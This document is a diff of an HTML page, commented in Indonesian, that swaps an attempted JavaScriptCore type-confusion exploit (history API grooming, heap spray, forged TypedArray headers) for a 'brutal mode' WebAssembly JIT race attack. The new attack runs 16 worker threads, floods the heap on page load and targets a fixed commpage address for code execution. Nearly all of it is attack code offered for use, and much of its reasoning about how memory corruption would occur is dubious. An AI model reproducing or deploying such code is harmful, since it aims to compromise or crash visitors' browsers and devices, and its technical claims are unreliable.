@@ -1,139 +1,157 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JSCore Type Confusion (History API Re-Exploited)</title>
+    <title>Wasm JIT Race Condition (BRUTAL MODE)</title>
+    <style>
+        body { background-color: #111; color: #0f0; font-family: courier; }
+        #log { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; }
+        .success { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
+    </style>
 </head>
 <body>
-
-    <h1>JSCore Type Confusion: JSArray to TypedArray (Final & Brutal)</h1>
-    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Type Confusion Attack...</p>
-    <div id="log-area"></div>
+    <h1>Wasm JIT Chaos (Target: PC Control)</h1>
+    <p>Target: 0x0000000FFFFFC320 (Commpage)</p>
+    <div id="status">INIT: Mempersiapkan Nuclear Threads...</div>
+    <div id="log"></div>
 
     <script>
-        // --- KONSTANTA COMM PAGE & JSCORE LAYOUT ---
-        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); 
+        // --- KONSTANTA COMM PAGE ---
+        // Target: Kita ingin PC (Program Counter) melompat ke sini
+        const COMM_PAGE_TARGET = BigInt("0x0000000FFFFFC320");
         
-        const PAYLOAD_HIGH_WORD = Number(TARGET_ADDRESS >> 32n);
-        const PAYLOAD_LOW_WORD = Number(TARGET_ADDRESS & 0xFFFFFFFFn);
-        
-        // Header TypedArray palsu (Header JSCell)
-        // Kita perlu menimpa StructureID agar JSC membacanya sebagai TypedArray
-        // Nilai ini harus di-fuzzing untuk versi iOS tertentu. Kita gunakan nilai placeholder yang umum.
-        const FAKE_STRUCTURE_ID = 0x41414141; // Placeholder
-        const FAKE_TYPE_INFO = 0x2A000000; // Placeholder Type (Uint32Array Type)
+        // Memecah menjadi 32-bit integer untuk SharedArrayBuffer
+        const LOW = Number(COMM_PAGE_TARGET & 0xFFFFFFFFn);
+        const HIGH = Number(COMM_PAGE_TARGET >> 32n);
 
-        let startTime = performance.now();
-        let payloadHolders = []; 
-        let victimJSArray = null;
-        let historyStates = [];
-        let corruptionPayload = new Uint32Array(32); // Buffer untuk menimpa header
-
-        function log(message, type = 'log-info') {
-            const timeElapsed = (performance.now() - startTime).toFixed(2);
-            const logElement = document.getElementById('log-area');
-            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
-            logElement.scrollTop = logElement.scrollHeight;
+        const LOG_EL = document.getElementById('log');
+        function log(msg) {
+            LOG_EL.innerHTML += `<div>[${(performance.now()/1000).toFixed(3)}] ${msg}</div>`;
+            LOG_EL.scrollTop = LOG_EL.scrollHeight;
         }
 
-        // --- FUNGSI SPRAY & PAYLOAD ---
-        function prepareCorruptionPayload() {
-            // Layout Header JSObject: 
-            // Offset 0x00: Structure ID (32-bit)
-            // Offset 0x04: Type Info (32-bit)
-            // Offset 0x08: Storage Pointer (64-bit)
+        // --- 1. MEMBUAT WEBASSEMBLY MODULE ---
+        // Modul Wasm minimal yang mengimpor fungsi dan memanggilnya.
+        // Kita akan mencoba menimpa index tabel fungsi ini.
+        const wasmCode = new Uint8Array([
+            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Magic & Version
+            0x01, 0x04, 0x01, 0x60, 0x00, 0x00,             // Type section
+            0x02, 0x0d, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x03, 0x72, 0x75, 0x6e, 0x00, 0x00, // Import "env.run"
+            0x03, 0x02, 0x01, 0x00,                         // Function section
+            0x07, 0x05, 0x01, 0x01, 0x6d, 0x00, 0x00,       // Export "m"
+            0x0a, 0x06, 0x01, 0x04, 0x00, 0x10, 0x00, 0x0b  // Code: call 0 (env.run)
+        ]);
 
-            // Timpa Header victimJSArray agar terlihat seperti TypedArray
-            corruptionPayload[0] = FAKE_STRUCTURE_ID;
-            corruptionPayload[1] = FAKE_TYPE_INFO;
-            
-            // Pointer ke data buffer palsu (Alamat Commpage)
-            corruptionPayload[2] = PAYLOAD_LOW_WORD;
-            corruptionPayload[3] = PAYLOAD_HIGH_WORD; 
-            
-            // Set Length (0xFFFFFFFF untuk OOB Read/Write)
-            corruptionPayload[4] = 0xFFFFFFFF; 
-            corruptionPayload[5] = 0x00000000; 
-        }
-        
-        function sprayPayload(count) {
-            log(`Memulai Spraying Payload (${count} objek)...`, "log-spray");
-            for (let i = 0; i < count; i++) {
-                // Spray Float64Array yang berisi header palsu kita
-                let tempArray = new Float64Array(corruptionPayload.buffer);
-                payloadHolders.push(tempArray); 
-            }
-        }
-
-        // --- FUNGSI UTAMA ATTACK ---
-        function runTypeConfusionAttack() {
-            prepareCorruptionPayload();
-            startTime = performance.now();
-            log("Phase 1: History Grooming & Victim Setup.", "log-init");
-
-            // 1. Grooming: Alokasikan banyak History State (untuk Fragmentasi Heap)
-            for (let i = 0; i < 50; i++) {
-                window.history.pushState({ id: i }, `Padding ${i}`, `#pad${i}`);
-            }
-            
-            // 2. Victim Setup: Alokasikan korban (JSArray) dan simpan di History State
-            victimJSArray = [0xDEADBEEF, 0xCAFEBABE, 0x12345678];
-            // Simpan di History State untuk memicu FREE (UAF)
-            window.history.pushState(victimJSArray, "Victim State", "#victim");
-            
-            // 3. FREE: Kembali 1 langkah (mem-free victimJSArray di C++ Heap)
-            window.history.go(-1);
-            log("Phase 2: Victim JSArray di-free (UAF aktif).", "log-critical");
-
-            // 4. SPRAY: Menimpa lokasi FREE dengan payload header korup
-            // Kita perlu memastikan ukuran payload sama dengan header JSArray yang di-free
-            sprayPayload(1000); 
-            log("Phase 3: SPRAY Header Corrupt (TypedArray palsu).", "log-critical");
-
-            // 5. TRIGGER: Akses kembali objek korban
-            setTimeout(() => {
-                log("Phase 4: Memicu Type Confusion pada Victim...", "log-critical");
+        // --- 2. WORKER SCRIPT (CHAOS ENGINE) ---
+        // Script ini akan dijalankan oleh BANYAK thread sekaligus
+        const workerScript = `
+            onmessage = async function(e) {
+                const { sab, id, targetLow, targetHigh, wasmBytes } = e.data;
+                const view = new Int32Array(sab);
                 
-                try {
-                    // Coba akses korban yang sekarang dianggap sebagai TypedArray dengan panjang 0xFFFFFFFF
-                    const corruptRead = victimJSArray[0]; 
-                    
-                    // Jika berhasil, corruptRead seharusnya berisi pointer Commpage
-                    if (typeof corruptRead !== 'number' && corruptRead.constructor === Uint32Array) {
-                         log("SUCCESS: Type Confusion Ditemukan! (JSArray -> TypedArray)", "log-success");
-                    } else if (corruptRead) {
-                        log(`Nilai Korup (Pertama) dibaca: 0x${corruptRead.toString(16)}`, "log-critical");
+                // Mode: ATTACKER (Writer)
+                // Terus menerus menulis alamat target ke memori bersama
+                if (id % 2 === 0) {
+                    while (true) {
+                        // Menulis alamat Commpage ke index 0
+                        // Atomics.store memaksa sinkronisasi memori (memperparah race)
+                        Atomics.store(view, 0, targetLow); 
+                        Atomics.store(view, 1, targetHigh);
+                        
+                        // Fuzzing: Kadang tulis nilai sampah untuk membingungkan JIT
+                        if (Math.random() < 0.01) Atomics.store(view, 0, 0x41414141);
                     }
-                    
-                    // Trigger Final: Arbitrary Write (menulis ke alamat Commpage yang dikorupsi)
-                    // victimJSArray[100] = 0x41414141; // Ini akan menulis ke alamat Commpage
+                } 
+                // Mode: VICTIM (Executor)
+                // Mencoba compile dan run Wasm secepat mungkin
+                else {
+                    const importObject = {
+                        env: {
+                            run: function() {
+                                // Fungsi dummy. Kita berharap Wasm TIDAK memanggil ini,
+                                // tapi melompat ke alamat yang kita inject di SAB.
+                                return 1;
+                            }
+                        }
+                    };
 
-                    // Trigger Final 2: FORCE Crash (Asumsi Type Confusion berhasil)
-                    // Coba akses index yang OOB
-                    const OOB_INDEX = 0x100000; 
-                    victimJSArray[OOB_INDEX] = 0x90909090; 
-                    
-                } catch(e) {
-                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
+                    while (true) {
+                        try {
+                            // Kompilasi instan berulang-ulang
+                            // Ini memicu alokasi memori RWX di JIT Server
+                            const module = await WebAssembly.compile(wasmBytes);
+                            const instance = await WebAssembly.instantiate(module, importObject);
+                            
+                            // EKSEKUSI!
+                            // Di sinilah kita berharap pointer function table korup
+                            instance.exports.m();
+                        } catch (err) {
+                            // Abaikan error, terus paksa
+                        }
+                    }
                 }
-            }, 50);
+            };
+        `;
+
+        // --- 3. PELUNCURAN SERANGAN ---
+        async function launchNuke() {
+            log("🚀 MELUNCURKAN MODE CHAOS V7...");
+            
+            // Shared Memory untuk Race Condition
+            const sharedBuffer = new SharedArrayBuffer(1024); // 1KB cukup untuk pointer
+            
+            // Membuat Blob URL untuk Worker
+            const blob = new Blob([workerScript], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
+            
+            const WORKER_COUNT = 16; // JUMLAH THREAD BRUTAL (Sesuaikan dengan core HP)
+            let workers = [];
+
+            log(`🔥 Mengerahkan ${WORKER_COUNT} Worker Threads...`);
+
+            for (let i = 0; i < WORKER_COUNT; i++) {
+                const w = new Worker(workerUrl);
+                w.postMessage({
+                    sab: sharedBuffer,
+                    id: i,
+                    targetLow: LOW,
+                    targetHigh: HIGH,
+                    wasmBytes: wasmCode
+                });
+                workers.push(w);
+            }
+
+            log("⚔️ Race Condition dimulai. JIT Compiler sedang diserang.");
+            log("Tunggu 10-20 detik. Jika freeze, itu tanda bagus.");
+
+            // --- 4. MEMORY PRESSURE TAMBAHAN ---
+            // Sambil worker berperang, main thread membanjiri Heap
+            // untuk mempersulit OS melakukan cleaning.
+            setTimeout(() => {
+                log("⚠️ Mengaktifkan HEAP FLOODING di Main Thread...");
+                let junk = [];
+                setInterval(() => {
+                    try {
+                        // Alokasi ArrayBuffer besar (10MB) berulang-ulang
+                        for(let k=0; k<100; k++) {
+                            junk.push(new ArrayBuffer(1024 * 1024 * 10));
+                        }
+                        // Buang sebagian untuk memicu GC (Garbage Collection)
+                        // GC yang berjalan saat JIT bekerja = RESEP BENCANA
+                        if (junk.length > 500) junk = []; 
+                        
+                        log(`Heap Pressure: ${junk.length} objek besar aktif.`);
+                    } catch(e) {
+                        log("Heap penuh. Bagus.");
+                        junk = []; // Reset dan ulangi
+                    }
+                }, 100);
+            }, 2000);
         }
-        
+
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian Type Confusion Attack...';
-            setTimeout(runTypeConfusionAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah RCE melalui Type Confusion.';
+            setTimeout(launchNuke, 1000);
         });
+
     </script>
-    <style>
-        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
-        .log-init { color: blue; }
-        .log-info { color: black; }
-        .log-spray { color: purple; }
-        .log-critical { color: red; font-weight: bold; }
-        .log-success { color: green; font-weight: bold; }
-        .log-error { color: darkred; font-weight: bold; }
-    </style>
 </body>
 </html>
